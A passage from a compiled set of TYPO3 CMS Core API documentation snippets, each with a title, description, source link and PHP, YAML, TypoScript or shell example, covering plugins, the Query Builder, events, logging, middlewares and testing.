'blog_example',\n    'Pi1',\n    'A Blog Example',\n);\n$GLOBALS['TCA']['tt_content']['types']['list']['subtypes_addlist'][$pluginSignature]\n    = 'pi_flexform';\nExtensionManagementUtility::addPiFlexFormValue(\n    $pluginSignature,\n    'FILE:EXT:blog_example/Configuration/FlexForms/PluginSettings.xml'\n);\n```\n\n----------------------------------------\n\nTITLE: Registering a Non-Extbase Plugin in TCA for Backend Use\nDESCRIPTION: Shows how to register a non-Extbase plugin in the TYPO3 backend using ExtensionManagementUtility::addPlugin() in TCA Overrides. This allows editors to insert the plugin as a content element.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\nExtensionManagementUtility::addPlugin(\n    [\n        // Plugin title in the backend\n        'My simple plugin',\n        // Unique identifier for the plugin\n        'my_plugin',\n        // Optional icon identifier\n        'my-extension-icon',\n    ]\n);\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Permission Options in TYPO3\nDESCRIPTION: Example code for registering custom permission options in ext_tables.php. It demonstrates how to create categories with multiple permission options, including descriptions and icons.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/CustomPermissions.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['customPermOptions'] = [\n    'tx_examples_cat1' => [\n        'header' => 'LLL:EXT:examples/Resources/Private/Language/locallang.xlf:permissions_header',\n        'items' => [\n            'key1' => [\n                'LLL:EXT:examples/Resources/Private/Language/locallang.xlf:permissions_option1',\n                'actions-system-typoscript-documentation-open',\n                'LLL:EXT:examples/Resources/Private/Language/locallang.xlf:permissions_option1_description',\n            ],\n            'key2' => [\n                'LLL:EXT:examples/Resources/Private/Language/locallang.xlf:permissions_option2',\n                'actions-system-typoscript-documentation-open',\n            ],\n            'key3' => [\n                'LLL:EXT:examples/Resources/Private/Language/locallang.xlf:permissions_option3',\n            ],\n        ],\n    ],\n    'tx_examples_cat2' => [\n        'header' => 'LLL:EXT:examples/Resources/Private/Language/locallang.xlf:permissions_header2',\n        'items' => [\n            'key1' => [\n                'LLL:EXT:examples/Resources/Private/Language/locallang.xlf:permissions_option4',\n            ],\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Language Service Translation Implementation\nDESCRIPTION: Shows how to implement language service translation with request context and fallback handling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Php.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\nprivate function getSeasons(ServerRequestInterface $request): array\n{\n    $languageService = $this->languageServiceFactory->createFromSiteLanguage(\n        $request->getAttribute('language')\n    );\n    return [\n        $languageService->sL('LLL:EXT:examples/Resources/Private/Language/seasons.xlf:spring'),\n        $languageService->sL('LLL:EXT:examples/Resources/Private/Language/seasons.xlf:summer'),\n        $languageService->sL('LLL:EXT:examples/Resources/Private/Language/seasons.xlf:autumn'),\n        $languageService->sL('LLL:EXT:examples/Resources/Private/Language/seasons.xlf:winter'),\n    ];\n```\n\n----------------------------------------\n\nTITLE: Saving Module Data in TYPO3\nDESCRIPTION: Stores module-specific data for the current user session using the pushModuleData method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n$compareFlags = $request->getParsedBody()['compareFlags'])\n    ?? $request->getQueryParams()['compareFlags'])\n    ?? null;\n$GLOBALS['BE_USER']->pushModuleData('tools_beuser/index.php/compare', $compareFlags);\n```\n\n----------------------------------------\n\nTITLE: Deactivating Existing MFA Provider in TYPO3 (YAML)\nDESCRIPTION: This snippet shows how to deactivate an existing MFA provider in TYPO3's Services.yaml file. It sets the 'active' property to false for the specified provider.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/MultiFactorAuthentication/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  totp:\n    tags:\n      - name: mfa.provider\n        active: false\n```\n\n----------------------------------------\n\nTITLE: Using Aliases in Field Selection with TYPO3 Query Builder\nDESCRIPTION: Example showing how to use SQL AS syntax to alias fields in a select query, which is particularly useful in join operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n// SELECT `tt_content`.`bodytext` AS `t1`.`text`\n$queryBuilder->select('tt_content.bodytext AS t1.text')\n```\n\n----------------------------------------\n\nTITLE: Using ExpressionBuilder::length() in TYPO3 Repository (PHP)\nDESCRIPTION: Shows how to use the length() function in a TYPO3 repository to get the length of a string field. It demonstrates creating a SELECT statement that includes the length of a field as part of the result.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_13\n\nLANGUAGE: PHP\nCODE:\n```\npublic function findWithLength(): array\n{\n    $queryBuilder = $this->connectionPool->getQueryBuilderForTable('my_table');\n    $queryBuilder\n        ->select('uid')\n        ->addSelect(\n            $queryBuilder->expr()->length('title'),\n            'title_length'\n        )\n        ->from('my_table');\n\n    return $queryBuilder->executeQuery()->fetchAllAssociative();\n}\n```\n\n----------------------------------------\n\nTITLE: Creating File Dump URLs in TYPO3\nDESCRIPTION: Examples of creating URLs for file downloads using the FileDumpController.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileFolder.rst#2025-04-16_snippet_11\n\nLANGUAGE: php\nCODE:\n```\n// For sys_file\n$queryParameterArray = [\n    't' => 'f',\n    'f' => $fileObject->getUid(),\n    's' => '320c:280c',\n];\n$queryParameterArray['token'] = $hashService->hmac(\n    implode('|', $queryParameterArray),\n    'resourceStorageDumpFile'\n);\n$url = 'index.php?eID=dumpFile&' . http_build_query($queryParameterArray);\n```\n\nLANGUAGE: php\nCODE:\n```\n// For sys_file_reference\n$queryParameterArray = [\n    't' => 'r',\n    'f' => $fileObject->getUid(),\n    'cv' => 'default',\n    's' => '320c:280c',\n];\n$queryParameterArray['token'] = $hashService->hmac(\n    implode('|', $queryParameterArray),\n    'resourceStorageDumpFile'\n);\n$url = 'index.php?eID=dumpFile&' . http_build_query($queryParameterArray);\n```\n\nLANGUAGE: php\nCODE:\n```\n// For sys_file_processedfile\n$queryParameterArray = [\n    't' => 'p',\n    'f' => $fileObject->getUid(),\n];\n$queryParameterArray['token'] = $hashService->hmac(\n    implode('|', $queryParameterArray),\n    'resourceStorageDumpFile'\n);\n$url = 'index.php?eID=dumpFile&' . http_build_query($queryParameterArray);\n```\n\n----------------------------------------\n\nTITLE: Logger Injection in TYPO3 Class with Autowiring\nDESCRIPTION: Example of injecting a logger into a custom TYPO3 class using constructor injection with autowiring. The logger is used to log messages at different severity levels.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Writers/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\MyFolder;\n\nuse Psr\\Log\\LoggerInterface;\n\nclass MyClass\n{\n    protected LoggerInterface $logger;\n\n    public function __construct(LoggerInterface $logger)\n    {\n        $this->logger = $logger;\n    }\n\n    public function doSomething(): void\n    {\n        // Log something\n        $this->logger->info('The extension did something');\n\n        // Log a warning with additional data\n        $this->logger->warning('Something went wrong', ['error' => 'not found']);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyLoadedPageTsConfigEvent Listener in TYPO3 PHP\nDESCRIPTION: This code snippet demonstrates how to implement a listener for the ModifyLoadedPageTsConfigEvent in TYPO3. It allows extensions to modify page TSconfig entries based on the root line.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Configuration/ModifyLoadedPageTsConfigEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Configuration\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Configuration\\Event\\ModifyLoadedPageTsConfigEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyLoadedPageTsConfigEvent $event): void\n    {\n        $rootLine = $event->getRootLine();\n        $tsConfig = $event->getTsConfig();\n\n        // Modify $tsConfig array here\n        $tsConfig['my_extension.']['newKey'] = 'newValue';\n\n        $event->setTsConfig($tsConfig);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: TYPO3 BeforeFileContentsSetEvent Class Reference\nDESCRIPTION: PSR-14 event class fired before file contents are set or replaced in TYPO3's File Abstraction Layer (FAL). Allows for content analysis and modification before the file driver writes the content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/BeforeFileContentsSetEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\BeforeFileContentsSetEvent\n```\n\n----------------------------------------\n\nTITLE: Initializing Backend User in Commands\nDESCRIPTION: Shows how to initialize a backend user in a TYPO3 console command to enable backend-related functionality like DataHandler.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Tutorial.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Core\\Bootstrap;\nuse Symfony\\Component\\Console\\Input\\InputInterface;\nuse Symfony\\Component\\Console\\Output\\OutputInterface;\n\nfinal class DoBackendRelatedThingsCommand extends Command\n{\n    protected function execute(InputInterface $input, OutputInterface $output): int\n    {\n        Bootstrap::initializeBackendAuthentication();\n        // Do backend related stuff\n\n        return Command::SUCCESS;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing the FormEngine Workflow in TYPO3\nDESCRIPTION: This code demonstrates the basic two-fold process of FormEngine: first creating and compiling data with FormDataCompiler, then rendering the form using FormEngine's render container. It shows how a controller initializes form data and processes it through to HTML output.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Overview/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$formDataGroup = GeneralUtility::makeInstance(TcaDatabaseRecord::class);\n$formDataCompiler = GeneralUtility::makeInstance(FormDataCompiler::class);\n$formDataCompilerInput = [\n    'vanillaUid' => (int)$request->getQueryParams()['edit']['pages'][0],\n    'tableName' => 'pages',\n    'command' => 'edit',\n];\n$formData = $formDataCompiler->compile($formDataCompilerInput, $formDataGroup);\n$formFactory = GeneralUtility::makeInstance(NodeFactory::class);\n$formResult = $formFactory->create($formData)->render();\n\n```\n\n----------------------------------------\n\nTITLE: Accessing Site Configuration in TypoScript\nDESCRIPTION: This snippet demonstrates how to use the 'site' property in TypoScript to access site configuration data. It shows examples of accessing the base URL and custom configuration keys.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/UseSiteInTypoScript.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\npage.10 = TEXT\npage.10.data = site:base\npage.10.wrap = This is your base URL: |\n```\n\nLANGUAGE: typoscript\nCODE:\n```\ndata = site:customConfigKey.nested.value\n```\n\n----------------------------------------\n\nTITLE: Counting Database Records with Connection in TYPO3\nDESCRIPTION: Example of using the count() method to count rows in a database table with specific criteria. This method returns the number of active rows matching the specified conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\npublic function findCountBySomething(string $something): int\n{\n    $connectionPool = GeneralUtility::makeInstance(ConnectionPool::class);\n    $connection = $connectionPool->getConnectionForTable('tx_myextension_mytable');\n    $count = $connection->count(\n        '*',\n        'tx_myextension_mytable',\n        ['some_value' => $something]\n    );\n    return $count;\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Extbase Frontend Plugin as Content Element in PHP\nDESCRIPTION: This PHP snippet registers an Extbase frontend plugin by adding it as an option to the 'Type' field of the content element. Utilizes TYPO3 configuration arrays and specifies parameters such as the extension key, plugin identifier, plugin title, and optional icon identifier.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FrontendPlugins.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\n\\TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility::registerPlugin(\n  'blog_example',\n  'PostSingle',\n  'LLL:EXT:blog_example/Resources/Private/Language/locallang_db.xlf:plugin.title'\n);\n```\n\n----------------------------------------\n\nTITLE: Disabling Password Reset Functionality in TYPO3 Backend\nDESCRIPTION: Configuration to disable the password reset functionality for all backend users. This can be added to the system configuration files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/AccessControl/PasswordReset/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['passwordReset'] = false;\n```\n\n----------------------------------------\n\nTITLE: Registering a FlexForm Configuration for a Custom Content Element\nDESCRIPTION: Example of attaching a FlexForm configuration to a custom content element type (CType) using the wildcard selector and specifying the CType as a parameter.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::addPiFlexFormValue(\n    '*',\n    // FlexForm configuration schema file\n    'FILE:EXT:example/Configuration/FlexForms/Registration.xml',\n    // ctype\n    'accordion'\n);\n```\n\n----------------------------------------\n\nTITLE: DataHandler Copy Mapping Structure in PHP\nDESCRIPTION: Example showing the structure of the copyMappingArray_merged property used to track copied records.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Database/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$copyMappingArray_merged = [\n   <table> => [\n      <original-record-uid> => <record-copy-uid>,\n   ],\n];\n```\n\n----------------------------------------\n\nTITLE: Unit Test for ArrayUtility: Basic Test Case in PHP\nDESCRIPTION: Shows a unit test class for the ArrayUtility class, demonstrating how to structure a test with PHPUnit and TYPO3 testing framework. Includes test method for trimExplode functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nclass ArrayUtilityTest extends \\TYPO3\\TestingFramework\\Core\\Unit\\UnitTestCase {\n    /**\n     * @test\n     * @dataProvider trimExplodeDataProvider\n     */\n    public function trimExplodeReturnsCorrectArray($input, $delimiter, $removeEmptyValues, $expected) {\n        $result = ArrayUtility::trimExplode($delimiter, $input, $removeEmptyValues);\n        self::assertSame($expected, $result);\n    }\n    \n    public function trimExplodeDataProvider() {\n        return [\n            'single value' => [' a ', ',', false, ['a']],\n            'whole array' => [' a , b , c ', ',', false, ['a', 'b', 'c']],\n            'sub array' => [' a , , c ', ',', true, ['a', 'c']]\n        ];\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Page Title Provider in PHP\nDESCRIPTION: Example of creating a custom page title provider class that extends AbstractPageTitleProvider. This provider sets the page title based on a record from an extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/PageTitleApi.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension\\PageTitle;\n\nuse TYPO3\\CMS\\Core\\PageTitle\\AbstractPageTitleProvider;\n\nclass MyOwnPageTitleProvider extends AbstractPageTitleProvider\n{\n    public function setTitle(string $title): void\n    {\n        $this->title = $title;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting TYPO3_CONF_VARS in PHP for TYPO3 Functional Test\nDESCRIPTION: Demonstrates how to set additional configuration in TYPO3_CONF_VARS for a functional test.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/FunctionalTesting/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\nprotected array $configurationToUseInTestInstance = [\n    'SYS' => [\n        'features' => [\n            'redirects.hitCount' => true,\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyBlindedConfigurationOptionsEvent Listener in TYPO3\nDESCRIPTION: Example event listener implementation that demonstrates how to blind (hide) sensitive configuration options using the ModifyBlindedConfigurationOptionsEvent. The listener checks the provider identifier and adds specific configuration paths to be hidden.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Lowlevel/ModifyBlindedConfigurationOptionsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Lowlevel\\EventListener;\n\nuse TYPO3\\CMS\\Lowlevel\\Event\\ModifyBlindedConfigurationOptionsEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyBlindedConfigurationOptionsEvent $event): void\n    {\n        if ($event->getProviderIdentifier() !== 'global') {\n            return;\n        }\n\n        $event->addBlindedConfigurationPath('MAIL/transport_smtp_password');\n        $event->addBlindedConfigurationPath('DB/Connections/Default/password');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Unidirectional 1:n Relationship in Extbase Model\nDESCRIPTION: This code demonstrates a unidirectional 1:n relationship from Post to Comments in Extbase, where the relationship is only known to the Post model and not to the Comment model.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Domain/Model.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n/**\n * The comments belonging to this post\n *\n * @var \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<\\MyVendor\\MyExtension\\Domain\\Model\\Comment>\n * @TYPO3\\CMS\\Extbase\\Annotation\\ORM\\Lazy\n * @TYPO3\\CMS\\Extbase\\Annotation\\ORM\\Cascade(\"remove\")\n */\nprotected $comments = null;\n\n/**\n * Initializes all ObjectStorage properties when model is constructed\n */\npublic function __construct()\n{\n    $this->comments = new \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage();\n}\n\n/**\n * Get the comments of this post\n *\n * @return \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<\\MyVendor\\MyExtension\\Domain\\Model\\Comment>\n */\npublic function getComments()\n{\n    return $this->comments;\n}\n\n/**\n * Sets the comments of this post\n *\n * @param \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<\\MyVendor\\MyExtension\\Domain\\Model\\Comment> $comments\n */\npublic function setComments(\\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage $comments)\n{\n    $this->comments = $comments;\n}\n\n/**\n * Add a comment to this post\n *\n * @param \\MyVendor\\MyExtension\\Domain\\Model\\Comment $comment\n */\npublic function addComment(\\MyVendor\\MyExtension\\Domain\\Model\\Comment $comment)\n{\n    $this->comments->attach($comment);\n}\n\n/**\n * Remove comment from this post\n *\n * @param \\MyVendor\\MyExtension\\Domain\\Model\\Comment $commentToRemove\n */\npublic function removeComment(\\MyVendor\\MyExtension\\Domain\\Model\\Comment $commentToRemove)\n{\n    $this->comments->detach($commentToRemove);\n}\n```\n\n----------------------------------------\n\nTITLE: Constructing Join Conditions in TYPO3 Query Builder (PHP)\nDESCRIPTION: Demonstrates how to create complex join conditions using the Query Builder's expression methods. The example shows joining tt_content_orig and sys_language tables with multiple equality conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_20\n\nLANGUAGE: php\nCODE:\n```\n$joinConditionExpression = $queryBuilder->expr()->and(\n    $queryBuilder->expr()->eq(\n        'tt_content_orig.sys_language_uid',\n        $queryBuilder->quoteIdentifier('sys_language.uid')\n    ),\n    $queryBuilder->expr()->eq(\n        'tt_content_orig.sys_language_uid',\n        $queryBuilder->quoteIdentifier('sys_language.uid')\n    ),\n);\n$queryBuilder->leftJoin(\n    'tt_content_orig',\n    'sys_language',\n    'sys_language',\n    (string)$joinConditionExpression\n);\n```\n\n----------------------------------------\n\nTITLE: Configuring Middlewares in TYPO3 RequestMiddlewares.php\nDESCRIPTION: This snippet shows the structure for configuring custom middlewares in TYPO3. It demonstrates how to register middlewares for frontend and backend stacks with their ordering dependencies.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Middlewares.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\nreturn [\n    'frontend' => [\n        'middleware-identifier' => [\n            'target' => \\MyVendor\\MyExtension\\Middleware\\CustomMiddleware::class,\n            'after' => [\n                'typo3/cms-frontend/timetracker'\n            ],\n            'before' => [\n                'typo3/cms-frontend/authentication'\n            ]\n        ],\n    ],\n    'backend' => [\n        'middleware-identifier' => [\n            'target' => \\MyVendor\\MyExtension\\Middleware\\CustomMiddleware::class,\n            'after' => [\n                'typo3/cms-core/normalized-params'\n            ],\n            'before' => [\n                'typo3/cms-backend/authentication'\n            ]\n        ],\n    ]\n];\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Email Subject in Fluid Template\nDESCRIPTION: Shows how to define a custom email subject within a Fluid template using a section.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: html\nCODE:\n```\n<f:section name=\"Subject\">New Login at \"{typo3.sitename}\"</f:section>\n```\n\n----------------------------------------\n\nTITLE: Setting hreflang tags in TYPO3 CMS\nDESCRIPTION: This code snippet demonstrates the format for setting hreflang tags using the setHrefLangs method. It shows an array structure with language codes as keys and corresponding URLs as values.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/ModifyHrefLangTagsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n[\n    'en-US' => 'https://example.com',\n    'nl-NL' => 'https://example.com/nl'\n]\n```\n\n----------------------------------------\n\nTITLE: Using setMaxResults and setFirstResult in TYPO3 Query Builder (PHP)\nDESCRIPTION: Demonstrates how to use setMaxResults and setFirstResult methods to add LIMIT and OFFSET clauses to a query. The example selects 2 records from the sys_language table, starting from the 5th record.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_24\n\nLANGUAGE: php\nCODE:\n```\n// SELECT * FROM `sys_language` LIMIT 2 OFFSET 4\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('sys_language');\n$queryBuilder\n    ->select('*')\n    ->from('sys_language')\n    ->setMaxResults(2)\n    ->setFirstResult(4)\n    ->executeQuery();\n```\n\n----------------------------------------\n\nTITLE: Extending fe_users Table with Custom Fields in TYPO3\nDESCRIPTION: This snippet demonstrates how to add two custom fields (tx_examples_options and tx_examples_special) to the fe_users table in TYPO3. It includes TCA configuration for the fields and shows how to add them to the backend interface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendingTca/Examples/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndefined('TYPO3') or die();\n\n// Add some fields to fe_users table to show TCA fields definitions\n\\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::addTCAcolumns('fe_users',\n   [\n      'tx_examples_options' => [\n         'exclude' => 0,\n         'label' => 'LLL:EXT:examples/Resources/Private/Language/locallang_db.xlf:fe_users.tx_examples_options',\n         'config' => [\n            'type' => 'select',\n            'renderType' => 'selectSingle',\n            'items' => [\n               ['',0,],\n               ['LLL:EXT:examples/Resources/Private/Language/locallang_db.xlf:fe_users.tx_examples_options.I.0',1,],\n               ['LLL:EXT:examples/Resources/Private/Language/locallang_db.xlf:fe_users.tx_examples_options.I.1',2,],\n               ['LLL:EXT:examples/Resources/Private/Language/locallang_db.xlf:fe_users.tx_examples_options.I.2','--div--',],\n               ['LLL:EXT:examples/Resources/Private/Language/locallang_db.xlf:fe_users.tx_examples_options.I.3',3,],\n            ],\n            'size' => 1,\n            'maxitems' => 1,\n         ],\n      ],\n      'tx_examples_special' => [\n         'exclude' => 0,\n         'label' => 'LLL:EXT:examples/Resources/Private/Language/locallang_db.xlf:fe_users.tx_examples_special',\n         'config' => [\n            'type' => 'user',\n            // renderType needs to be registered in ext_localconf.php\n            'renderType' => 'specialField',\n            'parameters' => [\n               'size' => '30',\n               'color' => '#F49700',\n            ],\n         ],\n      ],\n   ]\n);\n\\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::addToAllTCAtypes(\n   'fe_users',\n   'tx_examples_options, tx_examples_special'\n);\n```\n\n----------------------------------------\n\nTITLE: Using Comparison Expressions in PHP\nDESCRIPTION: Examples of various comparison expressions like equality, greater than or equal to, LIKE, NOT IN SET, and IN.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n// `bodytext` = 'foo' - string comparison\n->eq('bodytext', $queryBuilder->createNamedParameter('foo'))\n\n// `tt_content`.`bodytext` = 'foo'\n->eq('tt_content.bodytext', $queryBuilder->createNamedParameter('foo'))\n\n// `aTableAlias`.`bodytext` = 'foo'\n->eq('aTableAlias.bodytext', $queryBuilder->createNamedParameter('foo'))\n\n// `uid` = 42 - integer comparison\n->eq('uid', $queryBuilder->createNamedParameter(42, Connection::PARAM_INT))\n\n// `uid` >= 42\n->gte('uid', $queryBuilder->createNamedParameter(42, Connection::PARAM_INT))\n\n// `bodytext` LIKE 'lorem'\n->like(\n    'bodytext',\n    $queryBuilder->createNamedParameter(\n        $queryBuilder->escapeLikeWildcards('lorem')\n    )\n)\n\n// `bodytext` LIKE '%lorem%'\n->like(\n    'bodytext',\n    $queryBuilder->createNamedParameter(\n        '%' . $queryBuilder->escapeLikeWildcards('lorem') . '%'\n    )\n)\n\n// usergroup does not contain 42\n->notInSet('usergroup', $queryBuilder->createNamedParameter('42'))\n\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n// `uid` IN (42, 0, 44) - properly sanitized, mind the intExplode and PARAM_INT_ARRAY\n->in(\n    'uid',\n    $queryBuilder->createNamedParameter(\n        GeneralUtility::intExplode(',', '42, karl, 44', true),\n        Connection::PARAM_INT_ARRAY\n    )\n)\n\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n// `CType` IN ('media', 'multimedia') - properly sanitized, mind the PARAM_STR_ARRAY\n->in(\n    'CType',\n    $queryBuilder->createNamedParameter(\n        ['media', 'multimedia'],\n        Connection::PARAM_STR_ARRAY\n    )\n)\n```\n\n----------------------------------------\n\nTITLE: Using Database Parameter Types with Insert in TYPO3\nDESCRIPTION: Example of specifying parameter types when inserting data to ensure proper data type handling. This approach explicitly defines how values should be quoted in the database query.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\npublic function someMethod(): void\n{\n    $connection = $this->connectionPool->getConnectionForTable('tx_myextension_domain_model_mytable');\n    $connection->insert(\n        'tx_myextension_domain_model_mytable',\n        [\n            'pid' => 42,\n            'name' => 'New record',\n        ],\n        [\n            Connection::PARAM_INT,\n            Connection::PARAM_STR,\n        ]\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Pre-release Cache Warmup Command\nDESCRIPTION: Example of cache warmup command used during deployment preparation, specifically for warming up system caches on the live system before release.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 cache:warmup --group system\n```\n\n----------------------------------------\n\nTITLE: Configuring Composer Repository for Local Extensions in TYPO3\nDESCRIPTION: Configuration to add a local path repository to the project's 